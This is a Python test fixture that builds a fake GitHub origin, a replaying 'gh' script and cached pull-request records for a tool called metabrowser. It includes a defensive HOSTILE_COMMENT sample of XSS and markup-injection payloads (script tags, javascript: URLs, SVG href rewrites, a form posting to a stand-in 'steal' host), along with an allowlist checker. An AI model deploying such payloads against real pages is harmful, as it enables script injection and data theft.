"""A GitHub stand-in for pull-request tests: an origin, a fake ``gh``, and a cached home.

``build_origin`` writes a deterministic bare ``file://`` origin with ``git fast-import``,
so every commit ID is the same on every machine. It stands in for
``https://github.com/octo/demo`` and carries GitHub's own ``refs/pull/<n>/head``:

| PR | Shape | Head | Base the comparison starts from |
| --- | --- | --- | --- |
| 7 | open, from a fork | ``fork_head``, reachable only through ``refs/pull/7/head`` | the mirror's ``topic`` |
| 8 | merged, same repository | ``merged_head``, merged into ``topic`` | ``base.sha``, ``topic`` before the merge |
| 9 | closed, fork deleted | ``closed_head`` | ``base.sha``, a commit no mirrored ref reaches |
| 10 | open draft, same repository | ``draft_head`` on ``wip`` | the mirror's ``topic`` |

``scenario`` answers every ``gh api`` read of those pull requests from
``tests/fixtures/github-pull/responses.json``, scrubbed real responses, and ``gh auth
status`` for one signed-in account. ``install_fake_gh`` writes a ``gh`` that replays a
scenario and logs each call; it is a Python script run by this interpreter.

Run as a script, it builds ``<directory>/home``, an application home holding the
mirror and the records of all four pull requests, fetched through the production CLI
path with the fake ``gh`` and a fixed clock, and ``<directory>/root``::

    github_pull_fixture.py <directory>

With ``--serve``, it serves one of those pull requests from that home for a browser, as
the QA runbook's pull-request page walkthrough does::

    github_pull_fixture.py <directory> --serve <number> <port>
"""

from __future__ import annotations

import contextlib
import copy
import hashlib
import json
import os
import subprocess
import sys
from collections.abc import Generator, Mapping
from dataclasses import dataclass
from datetime import UTC, datetime
from pathlib import Path
from typing import Any, Final

CANONICAL: Final = "https://github.com/octo/demo"
READER: Final = "octo-reader"
FETCHED_AT: Final = datetime(2026, 9, 17, 12, 0, tzinfo=UTC)
RESPONSES: Final = Path(__file__).parent / "fixtures" / "github-pull" / "responses.json"
DEFAULT_BRANCH: Final = "topic"
_WHEN: Final = 1788000000

_FAKE_GH: Final = """#!{python}
import json, os, sys

args = sys.argv[1:]
log = os.environ.get("FAKE_GH_LOG")
state_path = os.environ["FAKE_GH_STATE"]
with open(os.environ["FAKE_GH_SCENARIO"], encoding="utf-8") as handle:
    scenario = json.load(handle)
try:
    with open(state_path, encoding="utf-8") as handle:
        counts = json.load(handle)
except FileNotFoundError:
    counts = {{}}


def pick(key, value):
    if not isinstance(value, list):
        return value
    index = counts.get(key, 0)
    counts[key] = index + 1
    with open(state_path, "w", encoding="utf-8") as handle:
        json.dump(counts, handle)
    return value[min(index, len(value) - 1)]


if log:
    watched = ("GH_PROMPT_DISABLED", "GH_NO_UPDATE_NOTIFIER", "NO_COLOR", "GH_DEBUG",
               "GH_HOST", "GH_REPO", "GH_FORCE_TTY", "CLICOLOR_FORCE")
    stdin_null = os.path.samestat(os.fstat(0), os.stat(os.devnull))
    with open(log, "a", encoding="utf-8") as handle:
        handle.write(json.dumps({{"args": args, "stdin_null": stdin_null,
                                 "env": {{name: os.environ.get(name) for name in watched}}}}) + "\\n")

if args[:2] == ["auth", "status"]:
    answer = pick("auth", scenario["auth"])
    sys.stdout.write(answer.get("stdout", ""))
    sys.stderr.write(answer.get("stderr", ""))
    sys.exit(answer.get("exit", 0))

if args[:1] == ["api"]:
    failure = scenario.get("api_failure")
    if failure:
        sys.stderr.write(failure["stderr"])
        sys.exit(failure.get("exit", 1))
    path, match, index = None, None, 1
    while index < len(args):
        arg = args[index]
        if arg in ("--hostname", "--method", "-H", "--jq"):
            if arg == "-H" and args[index + 1].startswith("If-None-Match: "):
                match = args[index + 1].split(": ", 1)[1]
            index += 2
            continue
        if not arg.startswith("-"):
            path = arg
        index += 1
    entry = pick(path, scenario["api"].get(path, {{"status": 404, "body": {{"message": "Not Found"}}}}))
    status = entry["status"]
    headers = dict(entry.get("headers", {{}}))
    body = entry["raw"].encode() if "raw" in entry else json.dumps(entry.get("body", None)).encode()
    if match is not None and headers.get("Etag") == match:
        status, body = 304, b""
    reason = {{200: "OK", 304: "Not Modified", 403: "Forbidden", 404: "Not Found",
              429: "Too Many Requests"}}.get(status, "Status")
    out = f"HTTP/2.0 {{status}} {{reason}}\\n".encode()
    for name, value in headers.items():
        out += f"{{name}}: {{value}}\\r\\n".encode()
    out += b"\\r\\n" + (body if status != 304 else b"")
    sys.stdout.buffer.write(out)
    if 200 <= status < 300:
        sys.exit(0)
    sys.stderr.write(f"gh: HTTP {{status}}\\n")
    sys.exit(1)

sys.stderr.write("fake gh: unexpected arguments\\n")
sys.exit(2)
"""


@dataclass(frozen=True, slots=True)
class Origin:
    """The origin repository and the commits the tests name."""

    path: Path
    commits: Mapping[str, str]

    @property
    def url(self) -> str:
        return f"file://{self.path.resolve()}"

    def __getitem__(self, name: str) -> str:
        return self.commits[name]


def git_env(root: Path) -> dict[str, str]:
    env = {name: value for name, value in os.environ.items() if not name.startswith("GIT_")}
    env["GIT_CONFIG_GLOBAL"] = str(root / ".gitconfig-absent")
    env["GIT_CONFIG_SYSTEM"] = str(root / ".gitconfig-absent")
    return env


def _commit(
    ref: str,
    mark: int,
    message: str,
    files: Mapping[str, str],
    *,
    parent: int | None,
    merge: int | None = None,
) -> bytes:
    stream = f"commit {ref}\nmark :{mark}\n"
    stream += f"committer Origin <origin@example.invalid> {_WHEN + mark * 3600} +0000\n"
    stream += f"data {len(message)}\n{message}\n"
    if parent is not None:
        stream += f"from :{parent}\n"
    if merge is not None:
        stream += f"merge :{merge}\n"
    for name, body in files.items():
        data = body.encode()
        stream += f"M 100644 inline {name}\ndata {len(data)}\n{body}\n"
    return (stream + "\n").encode()


def build_origin(directory: Path) -> Origin:
    """The origin; every pull-request ref is written the way GitHub writes it."""

    origin = directory / "github-pull-origin.git"
    env = git_env(directory)
    subprocess.run(
        ["git", "init", "-q", "--bare", "--template=", "-b", DEFAULT_BRANCH, str(origin)],
        check=True,
        capture_output=True,
        env=env,
    )
    topic = f"refs/heads/{DEFAULT_BRANCH}"
    stream = b"".join(
        [
            _commit(
                topic,
                1,
                "base",
                {"README.md": "# Demo\n", "src/app.txt": "one\n", "docs/guide.md": "# Guide\n"},
                parent=None,
            ),
            _commit(topic, 2, "topic moves", {"README.md": "# Demo\n\nOn topic.\n"}, parent=1),
            _commit("refs/pull/7/head", 3, "extra", {"src/app.txt": "one\nextra\n"}, parent=1),
            _commit(
                "refs/pull/7/head",
                4,
                "count to two",
                {"src/app.txt": "one\ntwo\n", "docs/new.md": "# New\n"},
                parent=3,
            ),
            _commit(
                "refs/pull/8/head",
                5,
                "more guide",
                {"docs/guide.md": "# Guide\n\nMore.\n"},
                parent=1,
            ),
            _commit(topic, 6, "Merge pull request #8", {}, parent=2, merge=5),
            _commit("refs/keep/rewritten", 7, "rewritten base", {"src/other.txt": "x\n"}, parent=1),
            _commit("refs/pull/9/head", 8, "spam", {"src/app.txt": "one\nspam\n"}, parent=1),
            _commit("refs/heads/wip", 9, "draft", {"docs/draft.md": "# Draft\n"}, parent=6),
            b"reset refs/pull/10/head\nfrom :9\n\n",
            b"done\n",
        ]
    )
    subprocess.run(
        ["git", "--git-dir", str(origin), "fast-import", "--quiet", "--done"],
        check=True,
        capture_output=True,
        input=stream,
        env=env,
    )

    def rev(ref: str) -> str:
        return subprocess.run(
            ["git", "--git-dir", str(origin), "rev-parse", ref],
            check=True,
            capture_output=True,
            text=True,
            env=env,
        ).stdout.strip()

    commits = {
        "base": rev(f"{topic}~1^1"),
        "topic_before_merge": rev(f"{topic}^1"),
        "topic": rev(topic),
        "fork_earlier": rev("refs/pull/7/head^"),
        "fork_head": rev("refs/pull/7/head"),
        "merged_head": rev("refs/pull/8/head"),
        "rewritten_base": rev("refs/keep/rewritten"),
        "closed_head": rev("refs/pull/9/head"),
        "draft_head": rev("refs/pull/10/head"),
    }
    return Origin(origin, commits)


def _etag(path: str, body: object) -> str:
    digest = hashlib.sha256(path.encode() + json.dumps(body, sort_keys=True).encode()).hexdigest()
    return f'W/"{digest}"'


def ok(path: str, body: object, headers: Mapping[str, str] | None = None) -> dict[str, Any]:
    """A ``200`` with a deterministic ETag and GitHub's rate-limit headers."""

    return {
        "status": 200,
        "headers": {
            "Etag": _etag(path, body),
            "X-Ratelimit-Limit": "5000",
            "X-Ratelimit-Remaining": "4999",
            "X-Ratelimit-Reset": "1790181960",
            **(headers or {}),
        },
        "body": body,
    }


def _substitute(value: Any, names: Mapping[str, str]) -> Any:
    if isinstance(value, str):
        for placeholder, commit in names.items():
            value = value.replace(placeholder, commit)
        return value
    if isinstance(value, list):
        return [_substitute(item, names) for item in value]  # pyright: ignore[reportUnknownVariableType]
    if isinstance(value, dict):
        return {key: _substitute(item, names) for key, item in value.items()}  # pyright: ignore[reportUnknownVariableType]
    return value


def recorded_responses() -> dict[str, Any]:
    with RESPONSES.open(encoding="utf-8") as handle:
        return json.load(handle)


def pull_bodies(origin: Origin) -> dict[int, dict[str, Any]]:
    """The API's view of each pull request, keyed by number."""

    template = recorded_responses()
    fork = _substitute(
        template,
        {
            "@HEAD@": origin["fork_head"],
            "@BASE@": origin["topic_before_merge"],
            "@EARLIER@": origin["fork_earlier"],
        },
    )
    pulls: dict[int, dict[str, Any]] = {7: fork}
    merged = copy.deepcopy(fork)
    merged["pull"].update(
        number=8,
        state="closed",
        merged=True,
        mergeable=None,
        merge_commit_sha=origin["topic"],
        title="Say more in the guide",
        body="",
        labels=[],
        user={"login": "maintainer"},
        merged_at="2026-09-16T18:00:00Z",
        closed_at="2026-09-16T18:00:00Z",
        html_url=f"{CANONICAL}/pull/8",
        base={
            "ref": "topic",
            "sha": origin["topic_before_merge"],
            "repo": {"full_name": "octo/demo"},
        },
        head={
            "ref": "guide-more",
            "sha": origin["merged_head"],
            "repo": {"full_name": "octo/demo"},
        },
    )
    pulls[8] = {**merged, "issue_comments": [], "reviews": [], "review_comments": []}
    closed = copy.deepcopy(fork)
    closed["pull"].update(
        number=9,
        state="closed",
        mergeable=None,
        title="spam",
        body=None,
        labels=[{"name": "invalid"}],
        user=None,
        closed_at="2026-09-16T19:00:00Z",
        html_url=f"{CANONICAL}/pull/9",
        base={"ref": "topic", "sha": origin["rewritten_base"], "repo": {"full_name": "octo/demo"}},
        head={"ref": "spam", "sha": origin["closed_head"], "repo": None},
    )
    pulls[9] = {**closed, "issue_comments": [], "reviews": [], "review_comments": []}
    draft = copy.deepcopy(fork)
    draft["pull"].update(
        number=10,
        draft=True,
        mergeable=False,
        title="WIP: draft the next page",
        body="Not ready.",
        labels=[],
        user={"login": "maintainer"},
        html_url=f"{CANONICAL}/pull/10",
        base={"ref": "topic", "sha": origin["topic"], "repo": {"full_name": "octo/demo"}},
        head={"ref": "wip", "sha": origin["draft_head"], "repo": {"full_name": "octo/demo"}},
    )
    empty_checks = {"total_count": 0, "check_runs": []}
    pending = {"state": "pending", "total_count": 0, "statuses": []}
    pulls[10] = {
        **draft,
        "issue_comments": [],
        "reviews": [],
        "review_comments": [],
        "check_runs": empty_checks,
        "status": pending,
    }
    return pulls


# A comment written to attack the pull-request page: markup that loads on render (a
# stylesheet, images, media, frames, SVG paint servers and filters with `url()`),
# rewrites a link (SVG SMIL), reaches the application's own styling and document-wide
# handlers (`class`, `data-*`), names an element for scripts (`id`, `name`), reports a
# click (`ping`, `attributionsrc`), styles itself, or submits. Its first line is ordinary
# Markdown that must survive.
HOSTILE_COMMENT: Final = (
    "Rebased on `topic`; see [the docs](docs/new.md).\n\n"
    '<link rel="stylesheet" href="http://127.0.0.1:9/evil.css"><style>p{color:red}</style>\n'
    '<img src="https://example.com/badge.png" alt="build badge"> <img src="javascript:alert(1)">\n'
    '<a id="metabrowser" name="settings" href="https://example.com/x" ping="https://e.x/p"'
    ' attributionsrc="https://e.x/a">x</a>\n'
    '<svg width="10" height="10"><rect width="10" height="10" fill="url(http://e.x/f#p)"'
    ' stroke="url(http://e.x/s#p)" marker-start="url(http://e.x/m#p)"'
    ' filter="url(http://e.x/fi#p)" mask="url(http://e.x/ma#p)"'
    ' clip-path="url(http://e.x/c#p)"/><use href="#kpress-icon-copy"></use>'
    '<a href="#x"><set attributeName="href" to="javascript:alert(1)"/>'
    '<animate attributeName="href" values="javascript:alert(1)"/>s</a></svg>\n'
    '<div data-kpress-video-id="dQw4w9WgXcQ">video</div>'
    '<span data-mb-copy="evil" data-nav-dir="up">copy</span>'
    '<div class="modal-overlay">fake dialog</div>'
    '<p style="cursor:url(http://e.x/c.png),auto">styled</p>\n'
    '<form action="https://e.x/steal"><input name="q" src="https://e.x/i.png"></form>'
    '<iframe src="https://e.x/f"></iframe><video src="https://e.x/v.mp4"></video>'
    "<script>alert(1)</script>\n"
)

# The markup the page may insert: its tags and, per tag, its attributes.
PAGE_TAGS: Final = frozenset(
    [
        "a",
        "b",
        "blockquote",
        "br",
        "code",
        "dd",
        "del",
        "details",
        "div",
        "dl",
        "dt",
        "em",
        "h1",
        "h2",
        "h3",
        "h4",
        "h5",
        "h6",
        "hr",
        "i",
        "ins",
        "kbd",
        "li",
        "ol",
        "p",
        "pre",
        "s",
        "span",
        "strong",
        "sub",
        "summary",
        "sup",
        "table",
        "tbody",
        "td",
        "tfoot",
        "th",
        "thead",
        "tr",
        "ul",
    ]
)
PAGE_ATTRIBUTES: Final = {
    "a": {"href", "target", "rel"},
    "ol": {"start"},
    "td": {"colspan", "rowspan", "align"},
    "th": {"colspan", "rowspan", "align"},
    "details": {"open"},
}


def allowlist_violations(html: str) -> list[str]:
    """Every tag and attribute in *html* the page may not insert, parsed as HTML."""

    from html.parser import HTMLParser

    found: list[str] = []

    class _Check(HTMLParser):
        def handle_starttag(self, tag: str, attrs: list[tuple[str, str | None]]) -> None:
            if tag not in PAGE_TAGS:
                found.append(f"<{tag}>")
            for name, value in attrs:
                if name not in PAGE_ATTRIBUTES.get(tag, set()):
                    found.append(f"{tag}[{name}]")
                elif name == "href" and not (value or "").startswith(("https://", "http://")):
                    found.append(f"{tag}[href={value}]")

    checker = _Check()
    checker.feed(html)
    checker.close()
    return found


def page(path: str) -> str:
    return f"{path}?per_page=100&page=1"


def api_entries(origin: Origin) -> dict[str, Any]:
    """Every ``gh api`` path of pull requests 7 to 10 and its recorded answer."""

    base = "repos/octo/demo"
    entries: dict[str, Any] = {}
    for number, parts in pull_bodies(origin).items():
        head = parts["pull"]["head"]["sha"]
        paths = {
            f"{base}/pulls/{number}": parts["pull"],
            page(f"{base}/issues/{number}/comments"): parts["issue_comments"],
            page(f"{base}/pulls/{number}/reviews"): parts["reviews"],
            page(f"{base}/pulls/{number}/comments"): parts["review_comments"],
            page(f"{base}/commits/{head}/check-runs"): parts["check_runs"],
            page(f"{base}/commits/{head}/status"): parts["status"],
        }
        for path, body in paths.items():
            entries[path] = ok(path, body)
    return entries


def account(login: str = READER, *, state: str = "success") -> dict[str, Any]:
    """A ``gh auth status --json hosts`` answer for one active github.com account."""

    host = {
        "state": state,
        "active": True,
        "host": "github.com",
        "login": login,
        "tokenSource": "keyring",
        "scopes": "repo",
        "gitProtocol": "https",
    }
    return {"stdout": json.dumps({"hosts": {"github.com": [host]}}) + "\n", "exit": 0}


def scenario(origin: Origin) -> dict[str, Any]:
    """Signed in as :data:`READER`, answering every read of pull requests 7 to 10."""

    return {"auth": account(), "api": api_entries(origin), "api_failure": None}


def install_fake_gh(directory: Path, answers: Mapping[str, Any]) -> dict[str, str]:
    """Write a ``gh`` replaying *answers*; return the environment that puts it first."""

    bin_dir = directory / "fake-gh-bin"
    bin_dir.mkdir(parents=True, exist_ok=True)
    gh = bin_dir / "gh"
    gh.write_text(_FAKE_GH.format(python=sys.executable), encoding="utf-8")
    gh.chmod(0o755)
    scenario_path = directory / "fake-gh-scenario.json"
    scenario_path.write_text(json.dumps(answers), encoding="utf-8")
    state = directory / "fake-gh-state.json"
    state.unlink(missing_ok=True)
    return {
        "PATH": f"{bin_dir}{os.pathsep}{os.environ.get('PATH', '')}",
        "FAKE_GH_SCENARIO": str(scenario_path),
        "FAKE_GH_STATE": str(state),
        "FAKE_GH_LOG": str(directory / "fake-gh-log.jsonl"),
    }


@contextlib.contextmanager
def _patched(target: object, name: str, value: object) -> Generator[None]:
    original = getattr(target, name)
    setattr(target, name, value)
    try:
        yield
    finally:
        setattr(target, name, original)


def build_home(directory: Path) -> None:
    """Cache the mirror and pull requests 7 to 10 through the production CLI path.

    The seams are the in-process goldens' own: the origin URL, the Git floor (CI's Git
    is below it), the clock, and a fake ``gh`` first on ``PATH``.
    """

    from metabrowser.builtin_plugins.github import pulls
    from metabrowser.cache import acquire
    from metabrowser.cache.urls import GitSource
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.git.process import detect_git_version

    origin = build_origin(directory)
    environment = install_fake_gh(directory, scenario(origin))
    version, _raw = detect_git_version()
    local = origin.url

    def remote_url_for(source: GitSource) -> str:
        return local if source.normalized == CANONICAL else source.normalized

    os.environ.update(environment)
    os.environ["METABROWSER_HOME"] = str(directory / "home")
    os.environ["METABROWSER_LOG_LEVEL"] = "ERROR"
    with (
        _patched(acquire, "remote_url_for", remote_url_for),
        _patched(acquire, "require_acquisition_git", lambda: version),
        _patched(pulls, "utc_now", lambda: FETCHED_AT),
    ):
        for number in (7, 8, 9, 10):
            try:
                _run_cli([f"{CANONICAL}/pull/{number}", "--no-serve"])
            except SystemExit as exc:
                if exc.code not in (0, None):
                    raise
    write_damaged_records(directory / "home")
    (directory / "root").mkdir(exist_ok=True)


def write_damaged_records(home: Path) -> None:
    """Records the route cannot use: 12 from another schema, 13 not JSON at all."""

    from metabrowser.cache.identity import cache_slug, source_identity
    from metabrowser.cache.paths import source_pull_record
    from metabrowser.home import write_private_file_atomic

    slug = cache_slug(
        "https", CANONICAL, source_identity("https", CANONICAL), slug_owner=lambda _slug: None
    )
    write_private_file_atomic(
        home, source_pull_record(slug, 12), json.dumps({"schema_version": 0}).encode()
    )
    write_private_file_atomic(home, source_pull_record(slug, 13), b"{not json")


def serve_stand_in(directory: Path, number: int, port: int) -> None:
    """Serve pull request *number* from a home :func:`build_home` wrote, for a browser.

    The same seams as :func:`build_home`, with the real clock, so the records read as
    stale and a refresh through the page asks the fake ``gh`` again. Nothing leaves
    ``127.0.0.1``: the mirror refreshes from the ``file://`` origin.
    """

    from metabrowser.cache import acquire
    from metabrowser.cache.urls import GitSource
    from metabrowser.cli.main import _run_cli  # pyright: ignore[reportPrivateUsage]
    from metabrowser.git.process import detect_git_version

    answers = json.loads((directory / "fake-gh-scenario.json").read_text(encoding="utf-8"))
    os.environ.update(install_fake_gh(directory, answers))
    os.environ["METABROWSER_HOME"] = str(directory / "home")
    local = (directory / "github-pull-origin.git").as_uri()
    version, _raw = detect_git_version()

    def remote_url_for(source: GitSource) -> str:
        return local if source.normalized == CANONICAL else source.normalized

    with (
        _patched(acquire, "remote_url_for", remote_url_for),
        _patched(acquire, "require_acquisition_git", lambda: version),
    ):
        _run_cli([f"{CANONICAL}/pull/{number}", "--no-open", "--port", str(port)])


if __name__ == "__main__":
    if len(sys.argv) == 5 and sys.argv[2] == "--serve":
        serve_stand_in(Path(sys.argv[1]).resolve(), int(sys.argv[3]), int(sys.argv[4]))
    elif len(sys.argv) == 2:
        build_home(Path(sys.argv[1]).resolve())
    else:
        raise SystemExit("usage: github_pull_fixture.py <directory> [--serve <number> <port>]")
